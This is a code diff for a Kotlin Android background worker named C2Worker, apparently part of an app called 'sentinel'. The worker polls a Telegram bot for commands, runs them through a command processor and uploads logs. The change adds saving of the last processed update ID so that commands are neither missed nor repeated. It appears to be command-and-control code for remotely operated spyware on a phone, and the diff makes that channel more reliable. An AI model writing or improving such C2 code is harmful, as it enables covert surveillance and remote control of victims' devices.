@@ -35,22 +35,19 @@ class C2Worker(
         try {
             Log.d("C2Worker", "Starting C2 cycle")
 
-            // 1. Process Commands
-            // We need to store/retrieve the last update ID to ensure we don't re-process or miss commands.
-            // For simplicity in this iteration, we might just poll. 
-            // Better: `TelegramClient` or `CommandProcessor` should handle offset persistence.
-            // Let's assume TelegramClient.pollUpdates handles logic or we just check recent.
-            // For now, let's just call processUpdates with 0 or a stored value.
-            // NOTE: Ideally SentinelService persisted this. We should add a Preference helper for this.
-            // But let's keep it simple: pollUpdates checks for new messages.
+            val prefs = com.zero.sentinel.data.EncryptedPrefsManager(applicationContext)
+            val lastUpdateId = prefs.getLastUpdateId()
+            val nextOffset = if (lastUpdateId == 0L) 0L else lastUpdateId + 1
             
-            // Note: TelegramClient implementation usually takes an offset. 
-            // If we don't track offset, we might get old messages.
-            // Let's assume for now we just run it. 
-            // Ideally, we add offsets to SharedPreferences in a future refactor.
+            Log.d("C2Worker", "Polling updates with offset: $nextOffset")
             
-            val updates = telegramClient.pollUpdates(0) 
-            commandProcessor.processUpdates(updates)
+            val updates = telegramClient.pollUpdates(nextOffset)
+            val maxUpdateId = commandProcessor.processUpdates(updates)
+            
+            if (maxUpdateId > lastUpdateId) {
+                prefs.saveLastUpdateId(maxUpdateId)
+                Log.d("C2Worker", "New max update ID saved: $maxUpdateId")
+            }
 
             // 2. Upload Logs
             uploadLogs()
